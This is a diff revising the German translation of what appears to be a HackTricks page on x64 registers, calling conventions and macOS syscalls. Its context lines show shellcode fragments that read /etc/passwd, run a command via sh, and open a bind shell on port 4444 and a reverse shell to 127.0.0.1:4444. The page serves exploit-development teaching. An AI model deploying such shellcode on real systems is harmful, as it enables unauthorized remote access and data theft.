@@ -4,72 +4,72 @@
 
 ## **Einführung in x64**
 
-x64, auch bekannt als x86-64, ist eine 64-Bit-Prozessorarchitektur, die überwiegend in Desktop- und Server-Computing verwendet wird. Sie stammt von der x86-Architektur, die von Intel produziert wurde und später von AMD unter dem Namen AMD64 übernommen wurde. Sie ist heute die vorherrschende Architektur in Personal Computern und Servern.
+x64, auch als x86-64 bekannt, ist eine 64-Bit-Prozessorarchitektur, die überwiegend in Desktop- und Server-Computing eingesetzt wird. Sie entstand aus der von Intel entwickelten x86-Architektur und wurde später von AMD unter dem Namen AMD64 übernommen. Heute ist sie die vorherrschende Architektur in Personal Computern und Servern.
 
 ### **Register**
 
-x64 baut auf der x86-Architektur auf und verfügt über **16 allgemeine Register**, die als `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` sowie `r8` bis `r15` bezeichnet werden. Jedes dieser Register kann einen **64-Bit** (8-Byte) Wert speichern. Diese Register haben auch 32-Bit-, 16-Bit- und 8-Bit-Teilregister für Kompatibilität und spezifische Aufgaben.
+x64 erweitert die x86-Architektur und verfügt über **16 universelle Register** mit den Bezeichnungen `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` sowie `r8` bis `r15`. Jedes dieser Register kann einen **64-Bit**-Wert (8 Byte) speichern. Diese Register verfügen außerdem über 32-Bit-, 16-Bit- und 8-Bit-Subregister für Kompatibilität und bestimmte Aufgaben.
 
-1. **`rax`** - Traditionell verwendet für **Rückgabewerte** von Funktionen.
-2. **`rbx`** - Oft als **Basisregister** für Speicheroperationen verwendet.
-3. **`rcx`** - Häufig verwendet für **Schleifenzähler**.
-4. **`rdx`** - In verschiedenen Rollen verwendet, einschließlich erweiterter arithmetischer Operationen.
-5. **`rbp`** - **Basiszeiger** für den Stackrahmen.
-6. **`rsp`** - **Stackzeiger**, der den oberen Teil des Stacks verfolgt.
-7. **`rsi`** und **`rdi`** - Verwendet für **Quell-** und **Zielindizes** in String-/Speicheroperationen.
-8. **`r8`** bis **`r15`** - Zusätzliche allgemeine Register, die in x64 eingeführt wurden.
+1. **`rax`** - Traditionell für **Rückgabewerte** von Funktionen verwendet.
+2. **`rbx`** - Häufig als **Basisregister** für Speicheroperationen verwendet.
+3. **`rcx`** - Üblicherweise für **Schleifenzähler** verwendet.
+4. **`rdx`** - Wird für verschiedene Aufgaben verwendet, einschließlich erweiterter arithmetischer Operationen.
+5. **`rbp`** - **Basiszeiger** für den Stack-Frame.
+6. **`rsp`** - **Stack-Zeiger**, der die Spitze des Stacks verfolgt.
+7. **`rsi`** und **`rdi`** - Für **Quell-** und **Zielindizes** bei String-/Speicheroperationen verwendet.
+8. **`r8`** bis **`r15`** - Zusätzliche universelle Register, die in x64 eingeführt wurden.
 
 ### **Aufrufkonvention**
 
-Die x64-Aufrufkonvention variiert zwischen Betriebssystemen. Zum Beispiel:
+Die x64-Aufrufkonvention variiert je nach Betriebssystem. Zum Beispiel:
 
-- **Windows**: Die ersten **vier Parameter** werden in den Registern **`rcx`**, **`rdx`**, **`r8`** und **`r9`** übergeben. Weitere Parameter werden auf den Stack geschoben. Der Rückgabewert befindet sich in **`rax`**.
-- **System V (häufig in UNIX-ähnlichen Systemen verwendet)**: Die ersten **sechs Integer- oder Zeigerparameter** werden in den Registern **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** und **`r9`** übergeben. Der Rückgabewert befindet sich ebenfalls in **`rax`**.
+- **Windows**: Die ersten **vier Parameter** werden in den Registern **`rcx`**, **`rdx`**, **`r8`** und **`r9`** übergeben. Weitere Parameter werden auf den Stack gelegt. Der Rückgabewert befindet sich in **`rax`**.
+- **System V (üblicherweise in UNIX-ähnlichen Systemen verwendet)**: Die ersten **sechs Integer- oder Zeigerparameter** werden in den Registern **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** und **`r9`** übergeben. Der Rückgabewert befindet sich ebenfalls in **`rax`**.
 
-Wenn die Funktion mehr als sechs Eingaben hat, werden die **restlichen auf dem Stack übergeben**. **RSP**, der Stackzeiger, muss **16 Byte ausgerichtet** sein, was bedeutet, dass die Adresse, auf die er zeigt, vor einem Aufruf durch 16 teilbar sein muss. Das bedeutet, dass wir normalerweise sicherstellen müssen, dass RSP in unserem Shellcode richtig ausgerichtet ist, bevor wir einen Funktionsaufruf machen. In der Praxis funktionieren Systemaufrufe jedoch oft, auch wenn diese Anforderung nicht erfüllt ist.
+Wenn die Funktion mehr als sechs Eingaben hat, wird der **Rest auf dem Stack übergeben**. **RSP**, der Stack-Zeiger, muss an **16 Byte ausgerichtet** sein. Das bedeutet, dass die Adresse, auf die er zeigt, vor jedem Aufruf durch 16 teilbar sein muss. Normalerweise müssten wir daher sicherstellen, dass RSP in unserem Shellcode korrekt ausgerichtet ist, bevor wir einen Funktionsaufruf durchführen. In der Praxis funktionieren system calls jedoch häufig auch dann, wenn diese Anforderung nicht erfüllt ist.
 
-### Aufrufkonvention in Swift
+### Calling Convention in Swift
 
-Swift hat seine eigene **Aufrufkonvention**, die in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) zu finden ist.
+Swift verfügt über eine eigene **Calling Convention**, die unter [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) zu finden ist.
 
-### **Häufige Anweisungen**
+### **Häufige Instructions**
 
-x64-Anweisungen haben einen umfangreichen Satz, der die Kompatibilität mit früheren x86-Anweisungen aufrechterhält und neue einführt.
+x64-Instructions verfügen über einen umfangreichen Befehlssatz, behalten die Kompatibilität mit früheren x86-Instructions bei und führen neue ein.
 
-- **`mov`**: **Bewege** einen Wert von einem **Register** oder **Speicherort** zu einem anderen.
-- Beispiel: `mov rax, rbx` — Bewegt den Wert von `rbx` nach `rax`.
-- **`push`** und **`pop`**: Werte auf den **Stack** schieben oder davon abziehen.
-- Beispiel: `push rax` — Schiebt den Wert in `rax` auf den Stack.
-- Beispiel: `pop rax` — Holt den obersten Wert vom Stack in `rax`.
-- **`add`** und **`sub`**: **Addition**- und **Subtraktions**operationen.
+- **`mov`**: Einen Wert von einem **Register** oder **Speicherort** in einen anderen verschieben.
+- Beispiel: `mov rax, rbx` — Verschiebt den Wert aus `rbx` nach `rax`.
+- **`push`** und **`pop`**: Werte auf den bzw. vom **Stack** legen oder entfernen.
+- Beispiel: `push rax` — Legt den Wert in `rax` auf den Stack.
+- Beispiel: `pop rax` — Entfernt den obersten Wert vom Stack und legt ihn in `rax`.
+- **`add`** und **`sub`**: Operationen zur **Addition** und **Subtraktion**.
 - Beispiel: `add rax, rcx` — Addiert die Werte in `rax` und `rcx` und speichert das Ergebnis in `rax`.
-- **`mul`** und **`div`**: **Multiplikations**- und **Divisions**operationen. Hinweis: Diese haben spezifische Verhaltensweisen bezüglich der Operandenverwendung.
-- **`call`** und **`ret`**: Verwendet, um **Funktionen aufzurufen** und **von ihnen zurückzukehren**.
-- **`int`**: Wird verwendet, um eine Software-**Unterbrechung** auszulösen. Z.B. wurde `int 0x80` für Systemaufrufe in 32-Bit x86 Linux verwendet.
-- **`cmp`**: **Vergleicht** zwei Werte und setzt die CPU-Flags basierend auf dem Ergebnis.
+- **`mul`** und **`div`**: Operationen zur **Multiplikation** und **Division**. Hinweis: Diese verfügen über spezielle Verhaltensweisen hinsichtlich der Verwendung von Operanden.
+- **`call`** und **`ret`**: Zum **Aufrufen** und **Zurückkehren aus Funktionen** verwendet.
+- **`int`**: Wird ausgelöst, um einen Software-**Interrupt** auszuführen. Beispielsweise wurde `int 0x80` für system calls in 32-Bit-x86-Linux verwendet.
+- **`cmp`**: Vergleicht zwei Werte und setzt die CPU-Flags basierend auf dem Ergebnis.
 - Beispiel: `cmp rax, rdx` — Vergleicht `rax` mit `rdx`.
-- **`je`, `jne`, `jl`, `jge`, ...**: **Bedingte Sprung**anweisungen, die den Kontrollfluss basierend auf den Ergebnissen eines vorherigen `cmp` oder Tests ändern.
-- Beispiel: Nach einer `cmp rax, rdx`-Anweisung, `je label` — Springt zu `label`, wenn `rax` gleich `rdx` ist.
-- **`syscall`**: Wird für **Systemaufrufe** in einigen x64-Systemen (wie modernen Unix) verwendet.
-- **`sysenter`**: Eine optimierte **Systemaufruf**-Anweisung auf einigen Plattformen.
+- **`je`, `jne`, `jl`, `jge`, ...**: **Bedingte Sprung**-Instructions, die den Kontrollfluss basierend auf den Ergebnissen eines vorherigen `cmp` oder Tests ändern.
+- Beispiel: Nach einer `cmp rax, rdx`-Instruction springt `je label` zu `label`, wenn `rax` gleich `rdx` ist.
+- **`syscall`**: Wird für **system calls** in einigen x64-Systemen verwendet (wie modernen Unix-Systemen).
+- **`sysenter`**: Eine optimierte Instruction für **system calls** auf einigen Plattformen.
 
 ### **Funktionsprolog**
 
-1. **Schiebe den alten Basiszeiger**: `push rbp` (speichert den Basiszeiger des Aufrufers)
-2. **Bewege den aktuellen Stackzeiger zum Basiszeiger**: `mov rbp, rsp` (richtet den neuen Basiszeiger für die aktuelle Funktion ein)
-3. **Allokiere Platz auf dem Stack für lokale Variablen**: `sub rsp, <size>` (wobei `<size>` die benötigte Anzahl von Bytes ist)
+1. **Den alten Basiszeiger auf den Stack legen**: `push rbp` (speichert den Basiszeiger des Callers)
+2. **Den aktuellen Stack-Zeiger in den Basiszeiger verschieben**: `mov rbp, rsp` (richtet den neuen Basiszeiger für die aktuelle Funktion ein)
+3. **Auf dem Stack Platz für lokale Variablen reservieren**: `sub rsp, <size>` (wobei `<size>` der benötigten Anzahl an Byte entspricht)
 
-### **Funktionsepilog**
+### **Funktions-Epilog**
 
-1. **Bewege den aktuellen Basiszeiger zum Stackzeiger**: `mov rsp, rbp` (deallokiert lokale Variablen)
-2. **Pop den alten Basiszeiger vom Stack**: `pop rbp` (stellt den Basiszeiger des Aufrufers wieder her)
-3. **Rückkehr**: `ret` (gibt die Kontrolle an den Aufrufer zurück)
+1. **Den aktuellen Basiszeiger in den Stack-Zeiger verschieben**: `mov rsp, rbp` (gibt lokale Variablen frei)
+2. **Den alten Basiszeiger vom Stack entfernen**: `pop rbp` (stellt den Basiszeiger des Callers wieder her)
+3. **Zurückkehren**: `ret` (gibt die Kontrolle an den Caller zurück)
 
 ## macOS
 
 ### syscalls
 
-Es gibt verschiedene Klassen von Syscalls, die Sie [**hier finden können**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
+Es gibt verschiedene Klassen von syscalls, die Sie [**hier finden**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -78,7 +78,7 @@ Es gibt verschiedene Klassen von Syscalls, die Sie [**hier finden können**](htt
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Dann können Sie jede Syscall-Nummer [**in dieser URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+Dann findest du jede Syscall-Nummer [**unter dieser URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -95,9 +95,9 @@ Dann können Sie jede Syscall-Nummer [**in dieser URL**](https://opensource.appl
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-Um den `open` syscall (**5**) aus der **Unix/BSD-Klasse** aufzurufen, müssen Sie ihn hinzufügen: `0x2000000`
+Um den `open`-Syscall (**5**) aus der **Unix/BSD class** aufzurufen, musst du Folgendes hinzufügen: `0x2000000`
 
-Die syscall-Nummer, um open aufzurufen, wäre `0x2000005`
+Die Syscall-Nummer zum Aufrufen von open wäre also `0x2000005`
 
 ### Shellcodes
 
@@ -118,7 +118,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 ```
 <details>
 
-<summary>C-Code zum Testen des Shellcodes</summary>
+<summary>C-Code zum Testen von shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -168,7 +168,7 @@ return 0;
 
 #### Shell
 
-Entnommen von [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.
+Entnommen [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -188,7 +188,7 @@ syscall
 ```
 {{#endtab}}
 
-{{#tab name="mit Stack"}}
+{{#tab name="with stack"}}
 ```armasm
 bits 64
 global _main
@@ -209,7 +209,7 @@ syscall
 
 #### Mit cat lesen
 
-Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, sodass das zweite Argument (x1) ein Array von Parametern ist (was im Speicher einen Stack der Adressen bedeutet).
+Das Ziel besteht darin, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen. Daher ist das zweite Argument (x1) ein Array von Parametern (was im Speicher einem Stack der Adressen entspricht).
 ```armasm
 bits 64
 section .text
@@ -240,7 +240,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Befehl mit sh ausführen
+#### Befehl mit sh aufrufen
 ```armasm
 bits 64
 section .text
@@ -278,9 +278,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Bind-Shell
+#### Bind shell
 
-Bind-Shell von [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **Port 4444**
+Bind shell von [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) auf **Port 4444**<sup>[2]</sup>.
 ```armasm
 section .text
 global _main
@@ -357,7 +357,7 @@ syscall
 ```
 #### Reverse Shell
 
-Reverse Shell von [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse Shell zu **127.0.0.1:4444**
+Reverse shell von [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell zu **127.0.0.1:4444**<sup>[3]</sup>
 ```armasm
 section .text
 global _main
@@ -419,4 +419,10 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+## Referenzen
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
+- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)
+
 {{#include ../../../banners/hacktricks-training.md}}
